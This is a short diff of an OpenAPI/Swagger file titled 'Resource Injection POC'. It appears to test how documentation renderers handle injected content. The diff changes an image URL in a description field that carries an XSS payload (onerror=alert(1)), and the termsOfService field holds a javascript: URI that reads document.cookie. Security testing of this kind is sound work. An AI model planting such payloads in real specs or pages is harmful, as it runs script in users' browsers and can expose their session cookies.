@@ -6,7 +6,7 @@ securityDefinitions:
 info:
   version: "0.0.1"
   title: Resource Injection POC
-  description: <img src="https://variety.com/wp-content/uploads/2021/07/Rick-Astley-Never-Gonna-Give-You-Up.png?w=2048" onerror=alert(1)>
+  description: <img src="https://static01.nyt.com/images/2019/10/06/arts/06jokers-ranked-ledger/06jokers-ranked-ledger-videoSixteenByNine3000.jpg?year=2019&h=1688&w=3000&s=f994d2a0d1a128eb7c2743e951c239765ba810b5bec002be592d2e20a895021e&k=ZQJBKqZ0VN&tw=1" onerror=alert(1)>
   termsOfService: "javascript:alert(document.cookie)"
 paths:
   /:
